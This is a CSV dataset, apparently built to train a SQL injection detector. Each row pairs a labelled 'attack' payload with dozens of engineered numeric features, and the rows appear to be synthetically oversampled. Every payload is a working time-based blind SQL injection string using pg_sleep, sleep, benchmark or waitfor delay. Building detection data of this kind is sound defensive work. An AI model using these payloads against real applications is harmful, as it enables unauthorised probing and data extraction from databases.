id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000153,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000210,0.8769997314899037,79.43052108556115,26.91202882989551,3.6828579837005204,27.606463425770126,10.0,31.694434595874615,10.12962306391641,0.3450542885861406,0.12768231087384513,0.4006283655007463,0.1266350350392679,0.0,3.3472172979373074,0.0,0.0,0.0,1.7824057659791026,0.0,4.0,0.0,1.0,0.0,1.7824057659791024,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.7824057659791025,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7824057659791026
SMOTE_000154,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,1.736177429834866,83.05739983952807,28.37929086532584,3.8756551617236896,26.218345352426955,17.758581730651677,28.54023637822472,10.540236378224721,0.3142769722241655,0.21237516240246465,0.3455018499215232,0.12784601545184665,3.459763621775279,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.540236378224721,0.5402363782247208,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.5402363782247208,0.0,2.7755575615628914e-17,0.0,1.0,0.4597636217752792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.8269759661899205,102.69778009645421,19.906659710637356,2.712028220048019,13.697780096454215,18.0,58.0,13.0,0.13336211960636066,0.17527507693354505,0.5647752478969784,0.12658755556311585,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.6977800964542151,0.30221990354578493,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000212,0.26725029811746454,111.86961472148239,29.277603397265167,3.441259850238988,39.555206794530335,10.0,49.555206794530335,12.759201132421722,0.35329877048509895,0.08962522189131936,0.4429239923764183,0.11415201524716342,0.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,8.759201132421722,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000157,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000301,0.9363369275423242,51.115306716534434,22.770683094184996,3.6784855664824585,21.590227698061664,3.5739405281644396,18.36091079224666,7.590227698061666,0.4322853360699316,0.06224959265171962,0.35590488797668945,0.1495601833016593,3.409772301938334,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.590227698061665,0.0,0.19674256602055507,0.19674256602055507,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.8032574339794449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.803257433979445
SMOTE_000158,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.5550147649914821,99.59468049954882,32.0,3.8045498644873383,30.199335062443602,18.0,40.19601037466162,11.199335062443602,0.303397614664325,0.18091025712438596,0.4032553405115936,0.11243678769969542,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.199335062443603,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.19933506244360277,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,1.1319492248025729,52.18549585150737,23.703626037123158,3.8157285000518275,17.37099170301474,9.629008296985258,17.0,8.18549585150737,0.3308870371055762,0.18711353758579669,0.3261485099908644,0.1558509153177627,3.1854958515073712,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000160,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000177,0.13952217141968584,46.14741598100487,17.0,2.8969908117412757,10.000000000000002,2.0,23.317932784803897,10.829483196200973,0.21766868326046654,0.04353373665209331,0.5039705907657654,0.23482698932167465,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.8294831962009743,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.7061437009871062,85.45764527288242,21.364411318220604,3.009335947496152,27.818646790932362,2.0,42.82035169101769,12.818646790932362,0.3272669151133455,0.023635588681779396,0.4990974962048751,0.15,1.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.818646790932362,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.7271177363558794,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.727117736355879
SMOTE_000162,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,nearest_attack_euclidean,R000256,0.43309021566315953,102.02226259091883,23.51954440595712,3.177227568688279,36.86590734326187,1.1731814686523734,49.290447904395094,14.692725874609494,0.363213185978017,0.01127281458585841,0.4814391562382636,0.144074843197861,3.1731814686523734,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.51954440595712,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000163,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.12745398483858517,69.95373637099459,23.138790887016246,3.394747936460813,19.185054516021662,10.0,30.861209112983754,9.907472741989169,0.27429251036700186,0.14295292676812715,0.4411426108505239,0.141611952014347,0.0,0.9537363709945847,2.0,0.0,0.0,1.0,0.0,4.9537363709945845,0.0,1.0,0.0,3.0,0.0,0.9537363709945845,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,time," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",nearest_attack_euclidean,R000232,0.512165069625437,51.505807147794236,19.0,3.45055487309175,25.325590469607686,1.1686023825980794,18.674409530392317,6.337204765196158,0.4925396253113078,0.022546446755522073,0.36212431277767315,0.12278961515549694,0.0,3.168602382598079,0.0,0.0,0.0,0.0,0.0,3.1686023825980785,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8313976174019213,0.0,2.7755575615628914e-17,0.0,1.0,0.16860238259807867,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,0.8341566766825431,61.61293053694472,18.23387210570603,3.0129076917976114,21.76612789429397,1.2338721057060305,29.443570008414568,9.169360528530149,0.36237024336332113,0.019527657897900202,0.4706510395195531,0.14745105921922558,0.0,3.23387210570603,0.0,0.0,0.0,1.0,0.0,4.935488422824119,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.7661278942939702,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7661278942939704
SMOTE_000166,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,1.392021771982014,83.03687286984646,27.52765465238485,3.970296225579508,32.96312713015354,15.0,26.0553093047697,9.018436434923233,0.39778108164093096,0.18074755366046522,0.3130910642962784,0.10838030040232535,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.5092182174616164,0.0,4.509218217461616,0.0,0.0,1.0,0.5092182174616164,1.0,0.0,0.0,0.0,0.0,0.5092182174616164,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,0.4573187950879486,49.58538571225016,19.804871429249946,3.401594039338381,12.58538571225016,10.0,20.0,7.0,0.2533984581449199,0.20178420050137302,0.40356840100274605,0.14124894035096108,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.8048714292499473,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.804871429249947
SMOTE_000168,attack,time,"1%"" rlike sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000302,0.2080087763949231,40.141080327020376,17.85891967297962,3.2833776763151334,13.07054016351019,1.9294598364898103,16.21162049053057,8.92945983648981,0.32558783469591823,0.04815251952711407,0.4036949609457719,0.22256468483119582,0.0,3.92945983648981,0.0,0.0,0.0,1.0,0.0,2.0705401635101897,1.92945983648981,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.07054016351019021,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.07054016351019
SMOTE_000169,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.20947782968003184,116.34663789230785,29.893865515692315,4.030818301418477,59.62025170400008,3.946932757846157,35.93865515692314,16.84079827353847,0.5123206724327403,0.0341369439306371,0.3074990088489177,0.14604337478770485,4.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,5.787731031384628,0.0,0.05306724215384295,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000170,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,1.2349610797485462,53.51581165757236,23.50316233151447,4.028786873398003,26.50316233151447,4.0,13.757905828786175,9.254743497271706,0.4973797266344553,0.07528600674290006,0.2553204780855748,0.1720137885370699,2.2484188342427647,3.006324663028941,0.0,0.0,0.0,0.0,0.0,1.7515811657572353,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.7515811657572351,0.0,0.24841883424276479,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.7515811657572352,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7515811657572353
SMOTE_000171,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.16090275566203346,83.73841460104838,20.0,2.971617436134917,27.0,2.0,41.99073168083871,12.747682920209677,0.32265629496642556,0.02390046629380929,0.5012441713273837,0.1521990674123814,1.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.747682920209677,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000172,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,1.0166087277950109,90.13893124026937,28.143511459955107,3.741656680583409,33.35763359496633,10.0,35.710686970246925,11.07061067505612,0.37524826696200536,0.1121004519802813,0.39072871279251353,0.12192256826519983,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.2141221350112237,0.0,4.856488540044896,0.0,1.0,0.0,1.2141221350112237,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.2141221350112237,0.7858778649887763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000173,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.6289000738953718,82.7021668482868,28.584282023340496,3.992848219323583,31.83143595331901,15.0,26.66287190663802,9.207858988329752,0.3851811430065364,0.18205208296716374,0.3213004813607355,0.1114662926655644,0.0,3.0,0.0,0.0,0.0,0.7921410116702473,0.0,4.415717976659505,0.0,0.0,1.0,0.7921410116702473,0.0,1.0,0.0,0.0,0.0,0.7921410116702473,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,0.010390265021133278,108.95097521734701,25.009804956530598,3.254657108294337,30.99673168115647,10.0,52.96078017387761,14.993463362312934,0.2845172283338179,0.09179096699458618,0.4860748928785153,0.1376169117930807,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,7.993463362312934,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.996731681156467,0.0032683188435329025,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000175,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.8087364105950614,51.98836997415874,18.3255799827725,3.4819137080182125,27.3255799827725,1.0,17.0,6.66278999138625,0.5255024074756595,0.019249671707864624,0.3272444190336986,0.12800350178277736,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.6627899913862498,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.33721000861375017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3372100086137504
SMOTE_000176,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,1.677356774620808,61.04090175657475,18.408922287280546,3.028469426052648,13.408922287280546,5.27137829824437,29.724912021927647,12.635689149122186,0.22802971208533912,0.07674989906469325,0.48552310621781514,0.20969728263215248,0.0,3.9999999999999996,0.0,0.0,0.0,1.4089222872805462,0.0,4.817844574561093,2.0,0.0,0.4089222872805462,1.4089222872805462,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.4089222872805462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4089222872805465
SMOTE_000177,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000161,0.22408930591550674,52.46918740933296,19.73459370466648,3.5744498652120704,27.6682421308331,1.06635157383338,16.80094527849986,6.93364842616662,0.5271612517705792,0.02056496687791874,0.32011484855422734,0.1321589327972747,0.0,3.06635157383338,0.0,0.0,0.0,0.0,0.0,2.93364842616662,0.0,0.9336484261666201,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.9336484261666201,0.0,2.7755575615628914e-17,0.0,1.0663515738333798,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0663515738333798,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.06635157383338
SMOTE_000178,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.035001966944319486,61.85766424916956,20.0,2.9888737036916786,13.0,10.85766424916956,30.0,8.0,0.21016667497641348,0.1754999674002241,0.4850000191763388,0.12933333844702366,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000179,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.8819700340428281,64.55077341652382,18.459896877796822,2.823333368531703,10.000000000000002,10.0,34.780721855422236,9.770051561101589,0.1566293745379472,0.15662937453794723,0.5344505261766944,0.15229072474741115,0.22994843889841188,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.310154683304765,0.22994843889841177,0.0,1.0,1.0,0.2299484388984117,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000293,0.0443599196971053,85.0,20.0,2.951054760428515,27.0,2.0,43.0,13.0,0.3176470588235294,0.023529411764705882,0.5058823529411764,0.15294117647058825,0.014214759816745248,0.985785240183255,0.0,0.0,1.0,0.0,0.0,9.0,1.0,0.0,0.0,1.0,0.014214759816745026,0.985785240183255,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000181,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.09139756972850019,85.80550804005946,26.902754020029736,3.431550035590603,16.032415326656754,20.935169346686493,37.87033869337298,10.967584673343245,0.18690401009469904,0.2439693161299112,0.4413139276319501,0.12781274614343968,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.967584673343245,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.967584673343245,0.03241532665675495,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.6593914293466392,108.31143325312823,29.31143325312823,3.726090146536205,27.377133493743546,27.622866506256457,42.0,11.311433253128229,0.2528041357659457,0.25500007516490275,0.38777776107446604,0.10441802799468552,0.3114332531282278,0.6885667468717722,0.6228665062564556,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.6228665062564556,0.3114332531282278,0.6885667468717722,0.3114332531282278,0.6885667468717722,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
